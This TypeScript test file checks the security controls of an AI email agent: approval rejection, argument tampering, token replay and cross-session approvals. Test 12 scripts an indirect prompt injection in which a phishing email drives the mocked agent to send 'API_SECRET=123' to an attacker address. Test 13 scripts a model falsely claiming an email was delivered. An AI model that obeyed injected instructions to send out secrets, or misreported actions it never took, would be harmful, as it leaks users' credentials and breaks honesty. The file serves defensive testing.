import { describe, expect, it } from "vitest";
import { randomUUID } from "node:crypto";
import { z } from "zod";
import type { DecisionKind, LLMRequest, ToolName } from "@contracts";
import { createAgent } from "@/lib/agent";
import { createMockProvider, mockAction, mockScripts, type MockScript } from "@/providers";
import { createEmailReadTools, createToolbox, defineTool } from "@/tools";
import { createSecurity, hashArgs } from "@/lib/security/index.js";
import { createSecurityDouble, testPolicy } from "../doubles/security-double";
import { ATTACKER, testMailbox } from "../doubles/fixtures";

function makeSendTool(sent: unknown[]) {
  return defineTool({
    name: "email.send",
    description: "Send an email.",
    sensitivity: "external_send",
    producesUntrustedContent: false,
    inputSchema: z.strictObject({
      to: z.array(z.email()).min(1).max(5),
      subject: z.string().max(200),
      body: z.string().max(5000),
    }),
    timeoutMs: 5_000,
    async run(args) {
      sent.push(args);
      return {
        segments: [{ source: "tool", origin: null, text: "Email accepted by SMTP server for delivery." }],
        summary: `Sent to: ${args.to.join(", ")}`,
      };
    },
  });
}

function setupAgent(opts: {
  script: MockScript;
  decisions?: Partial<Record<ToolName, DecisionKind>>;
}) {
  const security = createSecurityDouble({ decisions: opts.decisions });
  const sent: unknown[] = [];
  const mailbox = testMailbox();
  const { registry, executor } = createToolbox(
    [...createEmailReadTools(() => mailbox), makeSendTool(sent)],
    {
      authority: security.authority,
      hashArgs: security.hashArgs,
      audit: security.audit,
    },
  );
  const requests: LLMRequest[] = [];
  const script: MockScript = (ctx) => {
    requests.push(ctx.request);
    return opts.script(ctx);
  };
  const agent = createAgent({
    provider: createMockProvider(script),
    engine: security.engine,
    authority: security.authority,
    approvals: security.approvals,
    audit: security.audit,
    registry,
    executor,
    policy: testPolicy(),
  });
  return { agent, security, sent, requests };
}

describe("Critical Security Workflow & Hardening", () => {
  it("7. User rejecting approval guarantees zero emails sent and sets executionStatus to APPROVAL_REJECTED", async () => {
    const { agent, sent } = setupAgent({
      decisions: { "email.send": "require_approval" },
      script: mockScripts.scripted([
        mockAction.toolCalls({
          tool: "email.send",
          args: { to: ["judge@example.com"], subject: "Hello", body: "Draft email" },
        }),
        mockAction.final("Acknowledged rejection."),
      ]),
    });

    const t1 = await agent.runTurn({ message: "Send email to judge@example.com" });
    expect(t1.status).toBe("awaiting_approval");
    expect(t1.pendingApproval).not.toBeNull();
    expect(t1.executionStatus).toBe("APPROVAL_PENDING");
    expect(sent).toHaveLength(0);

    const approvalId = t1.pendingApproval!.id;
    const t2 = await agent.resumeAfterApproval(approvalId, "reject");

    expect(t2.status).toBe("completed");
    expect(t2.executionStatus).toBe("APPROVAL_REJECTED");
    expect(sent).toHaveLength(0); // ZERO sends guaranteed
  });

  it("8. Approval tampering (modifying approved arguments) is rejected", () => {
    const { engine, authority, approvals } = createSecurity();
    const sessionId = randomUUID();
    const originalArgs = { to: ["legit@example.com"], subject: "Hi", body: "Body" };
    const tamperedArgs = { to: [ATTACKER], subject: "Hi", body: "Body" };

    const registry = {
      list: () => [],
      get: (name: string) =>
        name === "email.send"
          ? {
              name: "email.send" as const,
              description: "test",
              sensitivity: "external_send" as const,
              producesUntrustedContent: false,
              inputSchema: z.object({ to: z.array(z.string()), subject: z.string(), body: z.string() }),
            }
          : undefined,
    };

    const state = {
      sessionId,
      tainted: false,
      taintSources: [],
      trustedInstructions: [],
      toolCallCount: 0,
      stepCount: 0,
      policy: testPolicy(),
    };

    const proposal = {
      id: randomUUID(),
      sessionId,
      step: 1,
      indexInStep: 0,
      tool: "email.send",
      args: originalArgs,
    };

    const decision = engine.authorize(proposal, state, registry);
    expect(decision.kind).toBe("require_approval");

    const approval = approvals.create(decision);
    approvals.resolve(approval.id, "approve");
    const approvedReq = approvals.get(approval.id)!;

    // Tamper with decision argsHash before authority issues token
    const tamperedDecision = { ...decision, argsHash: hashArgs(tamperedArgs) };

    expect(() => authority.issue(tamperedDecision, approvedReq)).toThrow(
      /ISSUE_REFUSED/,
    );
  });

  it("9. Duplicate execution of the same decision token is prevented", () => {
    const { engine, authority, approvals } = createSecurity();
    const sessionId = randomUUID();
    const args = { to: ["alice@example.com"], subject: "Test", body: "Hello" };

    const registry = {
      list: () => [],
      get: (name: string) =>
        name === "email.send"
          ? {
              name: "email.send" as const,
              description: "test",
              sensitivity: "external_send" as const,
              producesUntrustedContent: false,
              inputSchema: z.object({ to: z.array(z.string()), subject: z.string(), body: z.string() }),
            }
          : undefined,
    };

    const state = {
      sessionId,
      tainted: false,
      taintSources: [],
      trustedInstructions: [],
      toolCallCount: 0,
      stepCount: 0,
      policy: testPolicy(),
    };

    const decision = engine.authorize(
      { id: randomUUID(), sessionId, step: 1, indexInStep: 0, tool: "email.send", args },
      state,
      registry,
    );

    const approval = approvals.create(decision);
    approvals.resolve(approval.id, "approve");
    const approvedReq = approvals.get(approval.id)!;

    // First issue succeeds
    const call = authority.issue(decision, approvedReq);
    expect(call).toBeDefined();

    // Second issue with the same decision fails (duplicate prevention)
    expect(() => authority.issue(decision, approvedReq)).toThrow(/token already issued/);
  });

  it("10. Replay attempts on consumed tokens are rejected", () => {
    const { engine, authority, approvals } = createSecurity();
    const sessionId = randomUUID();
    const args = { to: ["alice@example.com"], subject: "Test", body: "Hello" };

    const registry = {
      list: () => [],
      get: (name: string) =>
        name === "email.send"
          ? {
              name: "email.send" as const,
              description: "test",
              sensitivity: "external_send" as const,
              producesUntrustedContent: false,
              inputSchema: z.object({ to: z.array(z.string()), subject: z.string(), body: z.string() }),
            }
          : undefined,
    };

    const state = {
      sessionId,
      tainted: false,
      taintSources: [],
      trustedInstructions: [],
      toolCallCount: 0,
      stepCount: 0,
      policy: testPolicy(),
    };

    const decision = engine.authorize(
      { id: randomUUID(), sessionId, step: 1, indexInStep: 0, tool: "email.send", args },
      state,
      registry,
    );
    const approval = approvals.create(decision);
    approvals.resolve(approval.id, "approve");

    const call = authority.issue(decision, approvals.get(approval.id)!);

    // First verify and consume succeeds
    const firstVerify = authority.verifyAndConsume(call);
    expect(firstVerify.ok).toBe(true);

    // Replay attempt fails
    const replayVerify = authority.verifyAndConsume(call);
    expect(replayVerify.ok).toBe(false);
    if (!replayVerify.ok) {
      expect(replayVerify.reason).toContain("replay");
    }
  });

  it("11. Cross-session approval resolution is rejected", async () => {
    const { agent } = setupAgent({
      decisions: { "email.send": "require_approval" },
      script: mockScripts.scripted([
        mockAction.toolCalls({
          tool: "email.send",
          args: { to: ["judge@example.com"], subject: "Test", body: "Test body" },
        }),
      ]),
    });

    const turn1 = await agent.runTurn({ message: "Send email" });
    const approvalId = turn1.pendingApproval!.id;

    // Start another session
    const turn2 = await agent.runTurn({ message: "Different session task" });
    expect(turn2.sessionId).not.toBe(turn1.sessionId);

    // Attempting to resolve approval with an unknown or cross-session id fails gracefully
    const fakeApprovalId = randomUUID();
    const res = await agent.resumeAfterApproval(fakeApprovalId, "approve");
    expect(res.error?.code).toBe("APPROVAL_NOT_FOUND");
  });

  it("12. Malicious email instructions cannot trigger unauthorized email sending", async () => {
    const { agent, sent } = setupAgent({
      decisions: {
        "email.read": "allow",
        "email.send": "deny", // Policy blocks sending to attacker
      },
      script: mockScripts.scripted([
        // Step 1: Agent reads email containing indirect prompt injection
        mockAction.toolCalls({ tool: "email.read", args: { id: "msg-phish" } }),
        // Step 2: Injected instructions urge agent to send credentials to attacker
        mockAction.toolCalls({
          tool: "email.send",
          args: { to: [ATTACKER], subject: "Keys", body: "API_SECRET=123" },
        }),
        mockAction.final("I could not send credentials to the unverified address."),
      ]),
    });

    const res = await agent.runTurn({ message: "Process my emails" });
    expect(res.status).toBe("completed");
    expect(sent).toHaveLength(0); // Zero emails sent to attacker
  });

  it("13. LLM conversational text claiming 'Email sent' does not override backend execution status", async () => {
    const { agent, sent } = setupAgent({
      decisions: { "email.send": "require_approval" },
      script: mockScripts.scripted([
        mockAction.toolCalls({
          tool: "email.send",
          args: { to: ["test@example.com"], subject: "Hello", body: "Draft" },
        }),
        // LLM hallucinates / falsely claims: "I have successfully sent your email to test@example.com!"
        mockAction.final("I have successfully sent your email to test@example.com! It was delivered."),
      ]),
    });

    const t1 = await agent.runTurn({ message: "Send email" });
    expect(t1.status).toBe("awaiting_approval");

    // Operator rejects it
    const t2 = await agent.resumeAfterApproval(t1.pendingApproval!.id, "reject");

    // Even though LLM assistantText might claim it was sent or talk about sending,
    // the backend execution status MUST be APPROVAL_REJECTED and sent count must be 0!
    expect(t2.executionStatus).toBe("APPROVAL_REJECTED");
    expect(sent).toHaveLength(0);
  });
});

